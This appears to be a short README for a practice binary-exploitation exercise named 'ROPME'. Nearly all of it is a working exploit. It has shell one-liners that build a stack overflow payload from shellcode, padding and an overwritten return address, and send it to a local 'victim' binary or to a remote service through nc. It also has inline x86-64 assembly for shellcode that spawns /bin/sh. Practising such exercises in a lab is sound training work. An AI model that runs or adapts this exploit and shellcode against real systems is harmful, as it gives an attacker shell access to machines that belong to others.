ROPME
=====

Practice for making rop host

Solution
========

	$ a=`printf %016x 0x7fffffffe090 | tac -rs..`
	$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; 	cat ) | setarch `arch` -R ./victim

or

	$ a=`printf %016x 0x7fffffffe090 | tac -rs..`
	$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;  cat ) | nc HOST PORT

Shellcode
=========

Sample shellcode for spawn /bin/sh shell

	int main() {
		asm("\
			needle0: jmp there\n\
			here:    pop %rdi\n\
			xor %rax, %rax\n\
			movb $0x3b, %al\n\
			xor %rsi, %rsi\n\
			xor %rdx, %rdx\n\
			syscall\n\
			there:   call here\n\
			.string \"/bin/sh\"\n\
			needle1: .octa 0xdeadbeef\n\
		");
	}
